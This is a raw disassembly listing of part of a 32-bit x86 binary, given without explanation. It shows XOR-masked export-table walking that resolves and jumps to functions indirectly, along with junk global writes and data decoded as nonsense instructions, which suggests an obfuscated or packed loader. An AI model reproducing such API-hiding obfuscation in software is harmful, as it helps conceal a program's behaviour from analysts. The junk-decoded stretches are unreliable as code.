  421c8c:	pop    edx
  421c8d:	inc    esi
  421c8e:	sahf   
  421c8f:	cdq    
  421c90:	pop    ss
  421c91:	cld    
  421c92:	(bad)  
  421c93:	push   ecx
  421c94:	in     eax,0xd
  421c96:	adc    ch,BYTE PTR [edx-0x7d]
  421c99:	xor    ch,BYTE PTR [ebp+0xb48c01f]
  421c9f:	sahf   
  421ca0:	std    
  421ca1:	stos   DWORD PTR es:[edi],eax
  421ca2:	mov    ecx,0x8b5031e
  421ca7:	(bad)  
  421ca8:	(bad)  
  421ca9:	dec    DWORD PTR [ecx-0x1f74b]
  421caf:	dec    DWORD PTR [ebx-0x1e77b]
  421cb5:	(bad)  
  421cb6:	cmp    DWORD PTR [ebp-0x1f8],eax
  421cbc:	je     0x421e28
  421cc2:	mov    eax,DWORD PTR [ebp-0x1f8]
  421cc8:	mov    ecx,DWORD PTR [ebp-0x20c]
  421cce:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  421cd3:	xor    eax,0xa59b
  421cd8:	movzx  eax,ax
  421cdb:	sar    eax,1
  421cdd:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421ce3:	mov    edx,DWORD PTR [ebp-0x20c]
  421ce9:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421cee:	xor    ecx,0xa59b
  421cf4:	movzx  ecx,cx
  421cf7:	shl    ecx,0xf
  421cfa:	or     eax,ecx
  421cfc:	movzx  eax,ax
  421cff:	mov    DWORD PTR [ebp-0x1fc],eax
  421d05:	jmp    0x421dde
  421d0a:	jg     0x421cee
  421d0c:	sbb    BYTE PTR [edx-0x144c4344],ch
  421d12:	outs   dx,BYTE PTR ds:[esi]
  421d13:	mov    esp,0x703490cd
  421d18:	hlt    
  421d19:	iret   
  421d1a:	cmp    cl,cl
  421d1c:	sar    BYTE PTR [esi-0x414141d2],0x3d
  421d23:	mov    al,0x8f
  421d25:	ret    
  421d26:	rcr    BYTE PTR [ecx],cl
  421d28:	je     0x421d50
  421d2a:	(bad)  
  421d2b:	sti    
  421d2c:	pop    ebp
  421d2d:	mov    ah,0x48
  421d2f:	mov    edx,0x1586b58f
  421d34:	add    DWORD PTR [eax-0x17],edx
  421d37:	xor    ebx,edx
  421d39:	mov    eax,0xbb72894f
  421d3e:	mov    ds:0xe70b588c,eax
  421d43:	fs inc edx
  421d45:	fwait
  421d46:	jnp    0x421cff
  421d48:	xor    BYTE PTR [ebx-0x6965f236],dl
  421d4e:	shr    bh,cl
  421d50:	or     eax,0xedd94416
  421d55:	bound  ebx,QWORD PTR [edx+0x6c]
  421d58:	pop    esi
  421d59:	sub    DWORD PTR [ebx+0x66],eax
  421d5c:	ins    BYTE PTR es:[edi],dx
  421d5d:	fld    TBYTE PTR [esi-0x37]
  421d60:	sub    dh,BYTE PTR [ebp-0x3d]
  421d63:	jns    0x421dc7
  421d65:	adc    ebx,DWORD PTR [ecx+edx*8]
  421d68:	sti    
  421d69:	cmp    al,0x6
  421d6b:	sub    BYTE PTR [edi+0x524c51a0],al
  421d71:	cdq    
  421d72:	add    BYTE PTR [edx+0x2],al
  421d75:	mov    eax,ebp
  421d77:	cld    
  421d78:	dec    ecx
  421d79:	scas   al,BYTE PTR es:[edi]
  421d7a:	ins    BYTE PTR es:[edi],dx
  421d7b:	loopne 0x421d41
  421d7d:	xor    BYTE PTR [ebx],cl
  421d7f:	cwde   
  421d80:	mov    al,ds:0xa49bad0f
  421d85:	je     0x421d2b
  421d87:	push   0x73
  421d89:	jle    0x421d55
  421d8b:	mov    al,BYTE PTR [ebp+0x3a]
  421d8e:	push   ds
  421d8f:	pop    eax
  421d90:	lahf   
  421d91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d92:	test   DWORD PTR [ebx+0x76],ecx
  421d95:	into   
  421d96:	pop    ss
  421d97:	fadd   QWORD PTR [eax-0x8f8628b]
  421d9d:	sbb    DWORD PTR [edx+0x1e],edi
  421da0:	out    0xbe,al
  421da2:	inc    esi
  421da3:	mov    ch,0xa8
  421da5:	loopne 0x421df0
  421da7:	add    eax,0xc5734379
  421dac:	adc    bh,BYTE PTR [bx+0xf3a]
  421db1:	out    0xd2,al
  421db3:	add    esp,edx
  421db5:	adc    dh,BYTE PTR [ebp+0x29492ddc]
  421dbb:	cld    
  421dbc:	cdq    
  421dbd:	ins    DWORD PTR es:[edi],dx
  421dbe:	inc    ebp
  421dbf:	fwait
  421dc0:	call   0xedc3600b
  421dc5:	jle    0x421e32
  421dc7:	out    dx,al
  421dc8:	sbb    eax,0x789e7d63
  421dcd:	mov    ah,0xe1
  421dcf:	pop    eax
  421dd0:	cmp    eax,0xeb5a2cfd
  421dd5:	mov    eax,0x9644c370
  421dda:	fs jnp 0x421da8
  421ddd:	sti    
  421dde:	mov    eax,DWORD PTR [ebp-0x1f8]
  421de4:	mov    ecx,DWORD PTR [ebp-0x20c]
  421dea:	movzx  eax,WORD PTR [ecx+eax*4]
  421dee:	xor    eax,0xa59b
  421df3:	movzx  eax,ax
  421df6:	sar    eax,1
  421df8:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421dfe:	mov    edx,DWORD PTR [ebp-0x20c]
  421e04:	movzx  ecx,WORD PTR [edx+ecx*4]
  421e08:	xor    ecx,0xa59b
  421e0e:	movzx  ecx,cx
  421e11:	shl    ecx,0xf
  421e14:	or     eax,ecx
  421e16:	mov    ecx,DWORD PTR [ebp-0x1fc]
  421e1c:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421e23:	jmp    0x421879
  421e28:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e2e:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e34:	xor    eax,0xcb79b576
  421e39:	xor    edx,0x9c2b8ae8
  421e3f:	mov    cl,0x2
  421e41:	call   0x408bb8
  421e46:	mov    esi,eax
  421e48:	mov    edi,edx
  421e4a:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e50:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e56:	xor    eax,0xcb79b576
  421e5b:	xor    edx,0x9c2b8ae8
  421e61:	mov    cl,0x3e
  421e63:	call   0x4223f7
  421e68:	or     esi,eax
  421e6a:	or     edi,edx
  421e6c:	mov    DWORD PTR [ebp-0x1e4],esi
  421e72:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e78:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e7e:	xor    eax,0xcb79b576
  421e83:	xor    edx,0x9c2b8ae8
  421e89:	mov    cl,0x2
  421e8b:	call   0x408bb8
  421e90:	mov    esi,eax
  421e92:	mov    edi,edx
  421e94:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e9a:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ea0:	xor    eax,0xcb79b576
  421ea5:	xor    edx,0x9c2b8ae8
  421eab:	mov    cl,0x3e
  421ead:	call   0x4223f7
  421eb2:	or     esi,eax
  421eb4:	or     edi,edx
  421eb6:	mov    DWORD PTR [ebp-0x23c],esi
  421ebc:	mov    DWORD PTR [ebp-0x238],edi
  421ec2:	mov    eax,DWORD PTR [ebp-0x23c]
  421ec8:	or     eax,DWORD PTR [ebp-0x238]
  421ece:	je     0x42212e
  421ed4:	lea    eax,[ebp-0x204]
  421eda:	mov    DWORD PTR [ebp-0x208],eax
  421ee0:	mov    eax,DWORD PTR [ebp-0x1e4]
  421ee6:	xor    edx,edx
  421ee8:	mov    cl,0x2
  421eea:	call   0x4223f7
  421eef:	mov    esi,eax
  421ef1:	mov    edi,edx
  421ef3:	mov    eax,DWORD PTR [ebp-0x1e4]
  421ef9:	xor    edx,edx
  421efb:	mov    cl,0x3e
  421efd:	call   0x408bb8
  421f02:	or     esi,eax
  421f04:	or     edi,edx
  421f06:	xor    esi,0xcb79b576
  421f0c:	xor    edi,0x9c2b8ae8
  421f12:	mov    eax,DWORD PTR [ebp-0x208]
  421f18:	mov    DWORD PTR [eax],esi
  421f1a:	mov    DWORD PTR [eax+0x4],edi
  421f1d:	mov    eax,DWORD PTR [ebp-0x1e4]
  421f23:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421f2b:	mov    eax,DWORD PTR [ebp-0x1e0]
  421f31:	mov    edx,DWORD PTR [ebp-0x1dc]
  421f37:	xor    eax,0xcb79b576
  421f3c:	xor    edx,0x9c2b8ae8
  421f42:	mov    cl,0x2
  421f44:	call   0x408bb8
  421f49:	mov    ebx,eax
  421f4b:	mov    edi,edx
  421f4d:	mov    eax,DWORD PTR [ebp-0x1e0]
  421f53:	mov    edx,DWORD PTR [ebp-0x1dc]
  421f59:	xor    eax,0xcb79b576
  421f5e:	xor    edx,0x9c2b8ae8
  421f64:	mov    cl,0x3e
  421f66:	call   0x4223f7
  421f6b:	or     ebx,eax
  421f6d:	or     edi,edx
  421f6f:	movsx  eax,bl
  421f72:	cmp    esi,eax
  421f74:	je     0x4220d4
  421f7a:	mov    eax,DWORD PTR [ebp-0x1e4]
  421f80:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421f88:	mov    eax,DWORD PTR [ebp-0x204]
  421f8e:	mov    edx,DWORD PTR [ebp-0x200]
  421f94:	xor    eax,0xcb79b576
  421f99:	xor    edx,0x9c2b8ae8
  421f9f:	mov    cl,0x2
  421fa1:	call   0x408bb8
  421fa6:	mov    edi,eax
  421fa8:	mov    ebx,edx
  421faa:	mov    eax,DWORD PTR [ebp-0x204]
  421fb0:	mov    edx,DWORD PTR [ebp-0x200]
  421fb6:	xor    eax,0xcb79b576
  421fbb:	xor    edx,0x9c2b8ae8
  421fc1:	mov    cl,0x3e
  421fc3:	call   0x4223f7
  421fc8:	or     edi,eax
  421fca:	or     ebx,edx
  421fcc:	mov    eax,DWORD PTR [ebp-0x210]
  421fd2:	movsx  eax,BYTE PTR [eax+edi*1]
  421fd6:	cmp    esi,eax
  421fd8:	je     0x421fe8
  421fde:	jmp    0x42212e
  421fe3:	jmp    0x4220d4
  421fe8:	mov    eax,DWORD PTR [ebp-0x204]
  421fee:	mov    edx,DWORD PTR [ebp-0x200]
  421ff4:	xor    eax,0xcb79b576
  421ff9:	xor    edx,0x9c2b8ae8
  421fff:	mov    cl,0x2
  422001:	call   0x408bb8
  422006:	mov    esi,eax
  422008:	mov    edi,edx
  42200a:	mov    eax,DWORD PTR [ebp-0x204]
  422010:	mov    edx,DWORD PTR [ebp-0x200]
  422016:	xor    eax,0xcb79b576
  42201b:	xor    edx,0x9c2b8ae8
  422021:	mov    cl,0x3e
  422023:	call   0x4223f7
  422028:	or     esi,eax
  42202a:	or     edi,edx
  42202c:	mov    eax,DWORD PTR [ebp-0x210]
  422032:	movsx  esi,BYTE PTR [eax+esi*1]
  422036:	mov    eax,DWORD PTR [ebp-0x1f0]
  42203c:	mov    edx,DWORD PTR [ebp-0x1ec]
  422042:	xor    eax,0xcb79b576
  422047:	xor    edx,0x9c2b8ae8
  42204d:	mov    cl,0x2
  42204f:	call   0x408bb8
  422054:	mov    ebx,eax
  422056:	mov    edi,edx
  422058:	mov    eax,DWORD PTR [ebp-0x1f0]
  42205e:	mov    edx,DWORD PTR [ebp-0x1ec]
  422064:	xor    eax,0xcb79b576
  422069:	xor    edx,0x9c2b8ae8
  42206f:	mov    cl,0x3e
  422071:	call   0x4223f7
  422076:	or     ebx,eax
  422078:	or     edi,edx
  42207a:	movsx  eax,bl
  42207d:	cmp    esi,eax
  42207f:	jne    0x4220d4
  422085:	mov    eax,DWORD PTR [ebp-0x1e0]
  42208b:	mov    edx,DWORD PTR [ebp-0x1dc]
  422091:	xor    eax,0xcb79b576
  422096:	xor    edx,0x9c2b8ae8
  42209c:	mov    cl,0x2
  42209e:	call   0x408bb8
  4220a3:	mov    esi,eax
  4220a5:	mov    edi,edx
  4220a7:	mov    eax,DWORD PTR [ebp-0x1e0]
  4220ad:	mov    edx,DWORD PTR [ebp-0x1dc]
  4220b3:	xor    eax,0xcb79b576
  4220b8:	xor    edx,0x9c2b8ae8
  4220be:	mov    cl,0x3e
  4220c0:	call   0x4223f7
  4220c5:	or     esi,eax
  4220c7:	or     edi,edx
  4220c9:	mov    DWORD PTR [ebp-0x214],esi
  4220cf:	jmp    0x422178
  4220d4:	mov    eax,DWORD PTR [ebp-0x1e0]
  4220da:	mov    edx,DWORD PTR [ebp-0x1dc]
  4220e0:	xor    eax,0xcb79b576
  4220e5:	xor    edx,0x9c2b8ae8
  4220eb:	mov    cl,0x2
  4220ed:	call   0x408bb8
  4220f2:	mov    esi,eax
  4220f4:	mov    edi,edx
  4220f6:	mov    eax,DWORD PTR [ebp-0x1e0]
  4220fc:	mov    edx,DWORD PTR [ebp-0x1dc]
  422102:	xor    eax,0xcb79b576
  422107:	xor    edx,0x9c2b8ae8
  42210d:	mov    cl,0x3e
  42210f:	call   0x4223f7
  422114:	or     esi,eax
  422116:	or     edi,edx
  422118:	add    esi,DWORD PTR [ebp-0x1e4]
  42211e:	mov    DWORD PTR [ebp-0x1e4],esi
  422124:	jmp    0x421e72
  422129:	jmp    0x421e72
  42212e:	mov    eax,DWORD PTR [ebp-0x1f0]
  422134:	mov    edx,DWORD PTR [ebp-0x1ec]
  42213a:	xor    eax,0xcb79b576
  42213f:	xor    edx,0x9c2b8ae8
  422145:	mov    cl,0x2
  422147:	call   0x408bb8
  42214c:	mov    esi,eax
  42214e:	mov    edi,edx
  422150:	mov    eax,DWORD PTR [ebp-0x1f0]
  422156:	mov    edx,DWORD PTR [ebp-0x1ec]
  42215c:	xor    eax,0xcb79b576
  422161:	xor    edx,0x9c2b8ae8
  422167:	mov    cl,0x3e
  422169:	call   0x4223f7
  42216e:	or     esi,eax
  422170:	or     edi,edx
  422172:	mov    DWORD PTR [ebp-0x214],esi
  422178:	mov    eax,DWORD PTR [ebp-0x214]
  42217e:	mov    DWORD PTR [ebp-0xc8],eax
  422184:	cmp    DWORD PTR [ebp-0xc8],0x0
  42218b:	je     0x4221b5
  422191:	mov    eax,DWORD PTR [ebp-0x144]
  422197:	mov    ecx,DWORD PTR [ebp-0xac]
  42219d:	movzx  eax,WORD PTR [ecx+eax*2]
  4221a1:	mov    ecx,DWORD PTR [ebp-0xa8]
  4221a7:	mov    eax,DWORD PTR [ecx+eax*4]
  4221aa:	mov    DWORD PTR [ebp-0xfc],eax
  4221b0:	jmp    0x4221ba
  4221b5:	jmp    0x420789
  4221ba:	cmp    DWORD PTR [ebp-0xfc],0x0
  4221c1:	jne    0x4221ce
  4221c7:	xor    eax,eax
  4221c9:	jmp    0x4223f0
  4221ce:	mov    eax,DWORD PTR [ebp+0x8]
  4221d1:	add    eax,DWORD PTR [ebp-0xfc]
  4221d7:	mov    DWORD PTR [ebp-0xec],eax
  4221dd:	mov    DWORD PTR [ebp-0x74],0x0
  4221e4:	cmp    DWORD PTR [ebp-0xb0],0x0
  4221eb:	je     0x422267
  4221f1:	cmp    DWORD PTR [ebp-0xb0],0x0
  4221f8:	je     0x422267
  4221fe:	mov    eax,DWORD PTR [ebp-0xb0]
  422204:	shl    eax,0x2
  422207:	mov    DWORD PTR [ebp-0x74],eax
  42220a:	mov    DWORD PTR [ebp-0x14c],0x0
  422214:	sub    esp,DWORD PTR [ebp-0x74]
  422217:	mov    DWORD PTR [ebp-0x14c],esp
  42221d:	mov    DWORD PTR [ebp-0x148],0x0
  422227:	mov    eax,DWORD PTR [ebp-0x148]
  42222d:	cmp    eax,DWORD PTR [ebp-0xb0]
  422233:	je     0x422267
  422239:	mov    eax,DWORD PTR [ebp-0x148]
  42223f:	mov    ecx,DWORD PTR [ebp-0x14c]
  422245:	mov    edx,DWORD PTR [ebp-0x148]
  42224b:	mov    esi,DWORD PTR [ebp+0x14]
  42224e:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  422252:	mov    DWORD PTR [ecx+eax*4],edx
  422255:	mov    eax,DWORD PTR [ebp-0x148]
  42225b:	inc    eax
  42225c:	mov    DWORD PTR [ebp-0x148],eax
  422262:	jmp    0x422227
  422267:	mov    DWORD PTR [ebp-0x9c],0x0
  422271:	push   0x4223a9
  422276:	jmp    DWORD PTR [ebp-0xec]
  42227c:	mov    eax,eax
  42227e:	mov    ecx,esp
  422280:	ret    0x8
  422283:	cmp    DWORD PTR ds:0x428405,0x0
  42228a:	not    DWORD PTR ds:0x428405
  422290:	mov    DWORD PTR ds:0x42841d,0x5307
  42229a:	mov    DWORD PTR ds:0x428575,0x4819
  4222a4:	jmp    0x4222e6
  4222a9:	not    eax
  4222ab:	cmp    DWORD PTR ds:0x428405,0x0
  4222b2:	jl     0x4222d4
  4222b8:	push   0x0
  4222ba:	call   DWORD PTR ds:0x42e13c
  4222c0:	add    DWORD PTR ds:0x4284f5,0x4c21
  4222ca:	and    DWORD PTR ds:0x4284dd,0x73e0
  4222d4:	sub    DWORD PTR ds:0x428449,edx
  4222da:	or     DWORD PTR ds:0x428351,ecx
  4222e0:	sub    DWORD PTR ds:0x4284ed,ebx
  4222e6:	push   ebx
  4222e7:	dec    eax
  4222e8:	push   esi
  4222e9:	mov    eax,DWORD PTR [esp+0x18]
  4222ed:	or     eax,eax
  4222ef:	mov    DWORD PTR ds:0x42840d,0x72ef
  4222f9:	jne    0x422335
  4222ff:	mov    ecx,DWORD PTR [esp+0x14]
  422303:	mov    eax,DWORD PTR [esp+0x10]
  422307:	xor    edx,edx
  422309:	inc    ebx
  42230a:	div    ecx
  42230c:	sbb    ebx,DWORD PTR ds:0x428559
  422312:	mov    ebx,eax
  422314:	mov    eax,DWORD PTR [esp+0xc]
  422318:	adc    DWORD PTR ds:0x4284dd,0x42846d
  422322:	div    ecx
  422324:	mov    DWORD PTR ds:0x428405,0x3a7e
  42232e:	mov    edx,ebx
  422330:	jmp    0x4223a4
  422335:	mov    ecx,eax
  422337:	mov    ebx,DWORD PTR [esp+0x14]
  42233b:	xor    eax,DWORD PTR ds:0x428579
  422341:	mov    edx,DWORD PTR [esp+0x10]
  422345:	mov    eax,DWORD PTR [esp+0xc]
  422349:	mov    DWORD PTR ds:0x428475,0x7dde
  422353:	shr    ecx,1
  422355:	mov    DWORD PTR ds:0x428565,0x121c
  42235f:	rcr    ebx,1
  422361:	shr    edx,1
  422363:	rcr    eax,1
  422365:	or     ecx,ecx
  422367:	jne    0x422349
  42236d:	div    ebx
  42236f:	mov    esi,eax
  422371:	mul    DWORD PTR [esp+0x18]
  422375:	mov    ecx,eax
  422377:	mov    eax,DWORD PTR [esp+0x14]
  42237b:	mul    esi
  42237d:	add    edx,ecx
  42237f:	jb     0x42239f
  422385:	cmp    edx,DWORD PTR [esp+0x10]
  422389:	ja     0x42239f
  42238f:	jb     0x4223a0
  422395:	cmp    eax,DWORD PTR [esp+0xc]
  422399:	jbe    0x4223a0
  42239f:	dec    esi
  4223a0:	xor    edx,edx
  4223a2:	mov    eax,esi
  4223a4:	pop    esi
  4223a5:	pop    ebx
  4223a6:	ret    0x10
  4223a9:	sub    DWORD PTR [ebp+0x10],0x1
  4223ad:	mov    DWORD PTR ds:0x4284e1,0x3767
  4223b7:	cmp    DWORD PTR [ebp+0x10],0x0
  4223bb:	mov    DWORD PTR ds:0x428569,0xcef
  4223c5:	je     0x4223da
  4223cb:	mov    esi,DWORD PTR ds:0x4284f9
  4223d1:	sbb    DWORD PTR ds:0x428565,esi
  4223d7:	add    esp,DWORD PTR [ebp-0x74]
  4223da:	mov    DWORD PTR [ebp-0x9c],eax
  4223e0:	mov    eax,DWORD PTR [ebp-0x9c]
  4223e6:	mov    DWORD PTR ds:0x428431,0x5e8f
  4223f0:	pop    edi
  4223f1:	pop    esi
  4223f2:	pop    ebx
  4223f3:	leave  
  4223f4:	ret    0x10
  4223f7:	cmp    cl,0x40
  4223fa:	mov    DWORD PTR ds:0x428435,0x7c93
  422404:	jae    0x422444
  42240a:	cmp    cl,0x20
  42240d:	mov    DWORD PTR ds:0x428371,0x440e
  422417:	jae    0x422423
  42241d:	shld   edx,eax,cl
  422420:	shl    eax,cl
  422422:	ret    
  422423:	movzx  edx,WORD PTR ds:0x4284c5
  42242a:	add    DWORD PTR ds:0x428475,edx
  422430:	mov    edx,eax
  422432:	xor    eax,eax
  422434:	mov    DWORD PTR ds:0x428361,0x5f4f
  42243e:	and    cl,0x1f
  422441:	shl    edx,cl
  422443:	ret    
  422444:	xor    eax,eax
  422446:	xor    edx,edx
  422448:	ret    
  422449:	add    BYTE PTR [eax],al
  42244b:	add    BYTE PTR [eax],al
  42244d:	add    BYTE PTR [eax],al
  42244f:	add    BYTE PTR [ebx+esi*2],al
  422452:	xchg   ecx,ebp
  422454:	push   ebx
  422455:	into   
  422456:	jns    0x4224b9
  422458:	push   0x98626f72
  42245d:	xor    eax,0x74b9d761
  422462:	jne    0x4224d2
  422464:	and    dl,bl
  422466:	mov    ch,0xed
  422468:	popf   
  422469:	bnd ret 0xa4
  42246d:	add    BYTE PTR [eax],al
  42246f:	add    BYTE PTR [edi+0x72],ah
  422472:	gs popa 
  422474:	je     0x4224dd
  422476:	jb     0x4224dd
  422478:	popa   
  422479:	je     0x4224e2
  42247b:	jb     0x4224e2
  42247d:	popa   
  42247e:	je     0x4224e7
  422480:	jb     0x4224e7
  422482:	popa   
  422483:	je     0x4224ec
  422485:	jb     0x4224ec
  422487:	popa   
  422488:	je     0x4224f1
  42248a:	jb     0x4224f1
  42248c:	popa   
  42248d:	je     0x4224f6
  42248f:	jb     0x4224f6
  422491:	popa   
  422492:	je     0x4224fb
  422494:	jb     0x4224fb
  422496:	popa   
  422497:	je     0x422500
  422499:	jb     0x422500
  42249b:	popa   
  42249c:	je     0x422505
  42249e:	jb     0x422505
  4224a0:	popa   
  4224a1:	je     0x4224a3
  4224a3:	add    BYTE PTR [eax+0x65],ch
  4224a6:	ins    BYTE PTR es:[edi],dx
  4224a7:	ins    BYTE PTR es:[edi],dx
  4224a8:	push   0x686c6c65
  4224ad:	gs ins BYTE PTR es:[edi],dx
  4224af:	ins    BYTE PTR es:[edi],dx
  4224b0:	push   0x686c6c65
  4224b5:	gs ins BYTE PTR es:[edi],dx
  4224b7:	ins    BYTE PTR es:[edi],dx
  4224b8:	push   0x686c6c65
  4224bd:	gs ins BYTE PTR es:[edi],dx
  4224bf:	ins    BYTE PTR es:[edi],dx
  4224c0:	push   0x686c6c65
  4224c5:	gs ins BYTE PTR es:[edi],dx
  4224c7:	ins    BYTE PTR es:[edi],dx
  4224c8:	push   0x686c6c65
  4224cd:	gs ins BYTE PTR es:[edi],dx
  4224cf:	ins    BYTE PTR es:[edi],dx
  4224d0:	push   0x686c6c65
  4224d5:	gs ins BYTE PTR es:[edi],dx
  4224d7:	ins    BYTE PTR es:[edi],dx
  4224d8:	add    BYTE PTR [eax],al
  4224da:	add    BYTE PTR [eax],al
  4224dc:	outs   dx,DWORD PTR ds:[esi]
  4224dd:	add    BYTE PTR [eax+eax*1+0x65],ch
  4224e1:	add    BYTE PTR [ecx+0x0],ah
  4224e4:	jne    0x4224e6
  4224e6:	je     0x4224e8
  4224e8:	xor    eax,DWORD PTR [eax]
  4224ea:	xor    al,BYTE PTR [eax]
  4224ec:	add    BYTE PTR [eax],al
  4224ee:	add    BYTE PTR [eax],al
  4224f0:	push   0x61006500
  4224f5:	add    BYTE PTR [esi+0x0],dh
  4224f8:	add    BYTE PTR gs:[esi+0x0],ch
  4224fc:	push   0x61006500
  422501:	add    BYTE PTR [esi+0x0],dh
  422504:	add    BYTE PTR gs:[esi+0x0],ch
  422508:	push   0x61006500
  42250d:	add    BYTE PTR [esi+0x0],dh
  422510:	add    BYTE PTR gs:[esi+0x0],ch
  422514:	push   0x61006500
  422519:	add    BYTE PTR [esi+0x0],dh
  42251c:	add    BYTE PTR gs:[esi+0x0],ch
  422520:	push   0x61006500
  422525:	add    BYTE PTR [esi+0x0],dh
  422528:	add    BYTE PTR gs:[esi+0x0],ch
  42252c:	push   0x61006500
  422531:	add    BYTE PTR [esi+0x0],dh
  422534:	add    BYTE PTR gs:[esi+0x0],ch
  422538:	push   0x61006500
  42253d:	add    BYTE PTR [esi+0x0],dh
  422540:	add    BYTE PTR gs:[esi+0x0],ch
  422544:	push   0x61006500
  422549:	add    BYTE PTR [esi+0x0],dh
  42254c:	add    BYTE PTR gs:[esi+0x0],ch
  422550:	push   0x61006500
  422555:	add    BYTE PTR [esi+0x0],dh
  422558:	add    BYTE PTR gs:[esi+0x0],ch
  42255c:	add    BYTE PTR [eax],al
  42255e:	add    BYTE PTR [eax],al
  422560:	fsub   QWORD PTR [edx+eax*2]
  422563:	add    BYTE PTR [edi+0x6c],cl
  422566:	gs dec ecx
  422568:	arpl   WORD PTR [edi+0x6e],bp
  42256b:	push   esp
  42256c:	outs   dx,DWORD PTR ds:[esi]
  42256d:	inc    ebx
  42256e:	jne    0x4225e2
  422570:	jae    0x4225e1
  422572:	jb     0x422574
  422574:	fs and eax,0x42
  42257a:	add    BYTE PTR [eax],al
  42257c:	add    BYTE PTR [eax],al
  42257e:	add    BYTE PTR [eax],al
  422580:	and    BYTE PTR [ecx],ch
  422582:	inc    edx
  422583:	add    BYTE PTR [eax],ch
  422585:	sub    DWORD PTR [edx+0x0],eax
  422588:	loopne 0x4225b1
  42258a:	inc    edx
  42258b:	add    dl,dh
  42258d:	inc    edx
  42258e:	push   ebx
  42258f:	lea    edx,ds:0x1a59ba5
  422595:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422596:	popf   
  422597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422598:	jno    0x42253f
  42259a:	xchg   edi,eax
  42259b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42259c:	or     esp,DWORD PTR [ebp-0x5aac5a77]
  4225a2:	and    DWORD PTR [ebp-0x5a7a5ae7],0xffffff9b
  4225a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225aa:	mov    ebx,0xd183d3a5
  4225af:	lea    edx,[ebp-0x645aea5b]
  4225b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225b6:	add    DWORD PTR [ebp-0x5a8e5a63],esp
  4225bc:	xchg   edi,eax
  4225bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225be:	or     esp,DWORD PTR [ebp-0x5aac5a77]
  4225c4:	and    DWORD PTR [ebp-0x5a7a5acb],0xffffff9b
  4225cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225cc:	mov    ebx,0xd1e3d3a5
  4225d1:	in     eax,dx
  4225d2:	xchg   ebp,eax
  4225d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225d4:	adc    eax,0x3ba59ba5
  4225d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225da:	popf   
  4225db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225dc:	sbb    DWORD PTR [ebp-0x5a805a6b],esp
  4225e2:	(bad)  
  4225e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225e4:	fwait
  4225e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225e6:	xchg   DWORD PTR [ebp-0x322e3c2d],esp
  4225ec:	icebp  
  4225ed:	sub    eax,0xf172ff7
  4225f2:	adc    eax,0x3a59109
  4225f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225f8:	fwait
  4225f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225fa:	add    esp,DWORD PTR [ebp-0x5a805a6d]
  422600:	xchg   ebp,eax
  422601:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422602:	sbb    DWORD PTR [ebp-0x5a645a73],esp
  422608:	and    DWORD PTR [ebp+0x2dd123d3],0xfffffff1
  42260f:	or     eax,0x6f170ff7
  422614:	adc    eax,0x3a59169
  422619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42261a:	fwait
  42261b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42261c:	add    esp,DWORD PTR [ebp-0x5a805a6d]
  422622:	xchg   ebp,eax
  422623:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422624:	xor    eax,0x9ba58da5
  422629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42262a:	and    DWORD PTR [ebp+0xdd103d3],0xfffffff1
  422631:	ins    DWORD PTR es:[edi],dx
  422632:	imul   DWORD PTR [edi+0x17]
  422635:	dec    edi
  422636:	adc    eax,0x37a59149
  42263b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42263c:	fwait
  42263d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42263e:	jae    0x4225e5
  422640:	popf   
  422641:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422642:	sbb    DWORD PTR [ebp-0x5aba5a6b],esp
  422648:	(bad)  
  422649:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42264a:	fwait
  42264b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42264c:	and    DWORD PTR [ebp+0x6dd163d3],0xfffffff1
  422653:	dec    ebp
  422654:	test   DWORD PTR [edi+0x16],0x91a914af
  42265b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42265c:	aaa    
  42265d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42265e:	fwait
  42265f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422660:	jae    0x422607
  422662:	popf   
  422663:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422664:	pop    ss
  422665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422666:	xchg   ebp,eax
  422667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422668:	push   ecx
